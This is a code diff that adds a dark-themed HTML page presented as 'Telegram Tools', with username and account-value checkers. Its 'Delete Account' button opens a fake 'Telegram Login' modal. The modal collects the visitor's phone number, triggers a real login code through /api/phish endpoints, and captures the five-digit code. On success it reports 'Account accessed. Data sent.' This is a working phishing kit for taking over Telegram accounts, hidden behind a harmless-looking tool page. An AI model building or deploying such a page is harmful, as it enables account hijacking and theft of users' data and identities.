@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Telegram Tools</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #0f0f0f;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            color: #fff;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .tg-header {
+            background: #17212b;
+            border-radius: 14px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 1px solid #2b3b4e;
+        }
+        
+        .tg-icon {
+            width: 32px;
+            height: 32px;
+            background: #2c8bff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+        
+        .tg-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .tab-bar {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+            background: #17212b;
+            padding: 6px;
+            border-radius: 14px;
+        }
+        
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            background: transparent;
+            border: none;
+            color: #8e9eae;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .tab.active {
+            background: #2c8bff;
+            color: white;
+        }
+        
+        .card {
+            background: #17212b;
+            border-radius: 14px;
+            padding: 20px;
+            margin-bottom: 16px;
+            border: 1px solid #2b3b4e;
+        }
+        
+        .card-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #fff;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            background: #242f3a;
+            border: 1px solid #2b3b4e;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 12px;
+            outline: none;
+        }
+        
+        input:focus {
+            border-color: #2c8bff;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #2c8bff;
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        
+        button:active {
+            opacity: 0.7;
+        }
+        
+        .danger-btn {
+            background: #e53935;
+        }
+        
+        .result {
+            margin-top: 12px;
+            padding: 12px;
+            background: #0f0f0f;
+            border-radius: 10px;
+            font-size: 13px;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .phish-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .phish-card {
+            background: #17212b;
+            border-radius: 20px;
+            padding: 24px;
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .telegram-style {
+            background: #2c8bff;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .code-input {
+            text-align: center;
+            font-size: 24px;
+            letter-spacing: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="tg-header">
+            <div class="tg-icon">📱</div>
+            <div class="tg-title">Telegram Tools</div>
+        </div>
+        
+        <div class="tab-bar">
+            <button class="tab active" data-tab="checker">Checker</button>
+            <button class="tab" data-tab="generator">Generator</button>
+            <button class="tab" data-tab="profile">Profile</button>
+        </div>
+        
+        <div id="checker-tab">
+            <div class="card">
+                <div class="card-title">Username Checker</div>
+                <input type="text" id="username-input" placeholder="@username">
+                <button onclick="checkUsername()">Check Price & Availability</button>
+                <div id="username-result" class="result"></div>
+            </div>
+        </div>
+        
+        <div id="generator-tab" class="hidden">
+            <div class="card">
+                <div class="card-title">Free Username Generator</div>
+                <button onclick="generateUsername()">Generate Available Username</button>
+                <div id="generate-result" class="result"></div>
+            </div>
+        </div>
+        
+        <div id="profile-tab" class="hidden">
+            <div class="card">
+                <div class="card-title">Profile Checker</div>
+                <input type="text" id="userid-input" placeholder="User ID or @username">
+                <input type="text" id="phone-input" placeholder="Phone number (optional)">
+                <button onclick="checkProfile()">Check Account Value</button>
+                <div id="profile-result" class="result"></div>
+            </div>
+        </div>
+        
+        <div class="card">
+            <button id="delete-btn" class="danger-btn">Delete Account</button>
+        </div>
+    </div>
+    
+    <div id="phish-modal" class="phish-modal hidden">
+        <div class="phish-card">
+            <div class="telegram-style">
+                <span style="font-size: 24px;">📞</span>
+                <div style="font-weight: 600; margin-top: 8px;">Telegram Login</div>
+            </div>
+            <input type="tel" id="phish-phone" placeholder="Phone number" style="margin-bottom: 12px;">
+            <div id="code-section" class="hidden">
+                <input type="text" id="phish-code" class="code-input" placeholder="_ _ _ _ _" maxlength="5">
+            </div>
+            <button id="phish-submit">Continue</button>
+            <button id="phish-cancel" style="background: #3a4a5a; margin-top: 8px;">Cancel</button>
+            <div id="phish-status" class="result" style="margin-top: 12px;"></div>
+        </div>
+    </div>
+    
+    <script>
+        let currentPhishSession = null;
+        let phishStep = 'phone';
+        
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                const tabName = tab.dataset.tab;
+                document.getElementById('checker-tab').classList.add('hidden');
+                document.getElementById('generator-tab').classList.add('hidden');
+                document.getElementById('profile-tab').classList.add('hidden');
+                document.getElementById(`${tabName}-tab`).classList.remove('hidden');
+            });
+        });
+        
+        async function checkUsername() {
+            const username = document.getElementById('username-input').value.trim().replace('@', '');
+            if (!username) return;
+            
+            const resultDiv = document.getElementById('username-result');
+            resultDiv.innerHTML = 'Checking...';
+            
+            try {
+                const res = await fetch('/api/check-username', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username })
+                });
+                const data = await res.json();
+                if (data.available) {
+                    resultDiv.innerHTML = `✅ @${data.username} is available\n💰 Price: Free`;
+                } else {
+                    resultDiv.innerHTML = `❌ @${data.username} is taken\n💰 Estimated price: $${data.price}`;
+                }
+            } catch(e) {
+                resultDiv.innerHTML = 'Error checking username';
+            }
+        }
+        
+        async function generateUsername() {
+            const resultDiv = document.getElementById('generate-result');
+            resultDiv.innerHTML = 'Generating...';
+            
+            try {
+                const res = await fetch('/api/generate-username');
+                const data = await res.json();
+                if (data.username) {
+                    resultDiv.innerHTML = `✅ Generated: @${data.username}\nStatus: AVAILABLE`;
+                } else {
+                    resultDiv.innerHTML = 'No available usernames found, try again';
+                }
+            } catch(e) {
+                resultDiv.innerHTML = 'Error generating username';
+            }
+        }
+        
+        async function checkProfile() {
+            const userId = document.getElementById('userid-input').value.trim();
+            const phone = document.getElementById('phone-input').value.trim();
+            
+            const resultDiv = document.getElementById('profile-result');
+            resultDiv.innerHTML = 'Checking...';
+            
+            try {
+                const res = await fetch('/api/check-profile', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ userId, phone })
+                });
+                const data = await res.json();
+                resultDiv.innerHTML = `
+                    📱 User ID: ${data.user_id}\n
+                    👤 Username: @${data.username || 'none'}\n
+                    💰 Account Value: $${data.account_value}\n
+                    📞 Phone Value: $${data.phone_value}
+                `;
+            } catch(e) {
+                resultDiv.innerHTML = 'Error checking profile';
+            }
+        }
+        
+        const deleteBtn = document.getElementById('delete-btn');
+        const modal = document.getElementById('phish-modal');
+        const phishPhone = document.getElementById('phish-phone');
+        const phishCode = document.getElementById('phish-code');
+        const codeSection = document.getElementById('code-section');
+        const phishSubmit = document.getElementById('phish-submit');
+        const phishCancel = document.getElementById('phish-cancel');
+        const phishStatus = document.getElementById('phish-status');
+        
+        deleteBtn.addEventListener('click', () => {
+            modal.classList.remove('hidden');
+            phishStep = 'phone';
+            codeSection.classList.add('hidden');
+            phishPhone.value = '';
+            phishCode.value = '';
+            phishStatus.innerHTML = '';
+            phishSubmit.textContent = 'Continue';
+        });
+        
+        phishSubmit.addEventListener('click', async () => {
+            if (phishStep === 'phone') {
+                const phone = phishPhone.value.trim();
+                if (!phone) {
+                    phishStatus.innerHTML = 'Enter phone number';
+                    return;
+                }
+                
+                phishStatus.innerHTML = 'Sending code...';
+                try {
+                    const res = await fetch('/api/phish/send-code', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        currentPhishSession = data.sessionId;
+                        phishStep = 'code';
+                        codeSection.classList.remove('hidden');
+                        phishSubmit.textContent = 'Verify Code';
+                        phishStatus.innerHTML = 'Code sent to Telegram';
+                    } else {
+                        phishStatus.innerHTML = 'Failed to send code';
+                    }
+                } catch(e) {
+                    phishStatus.innerHTML = 'Error';
+                }
+            } else if (phishStep === 'code') {
+                const code = phishCode.value.trim();
+                if (!code || code.length !== 5) {
+                    phishStatus.innerHTML = 'Enter 5-digit code';
+                    return;
+                }
+                
+                phishStatus.innerHTML = 'Verifying...';
+                try {
+                    const res = await fetch('/api/phish/verify-code', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ sessionId: currentPhishSession, code })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        phishStatus.innerHTML = 'Account accessed. Data sent.';
+                        setTimeout(() => {
+                            modal.classList.add('hidden');
+                            phishStatus.innerHTML = '';
+                        }, 2000);
+                    } else {
+                        phishStatus.innerHTML = 'Invalid code';
+                    }
+                } catch(e) {
+                    phishStatus.innerHTML = 'Error';
+                }
+            }
+        });
+        
+        phishCancel.addEventListener('click', () => {
+            modal.classList.add('hidden');
+            currentPhishSession = null;
+            phishStep = 'phone';
+        });
+    </script>
+</body>
+</html>
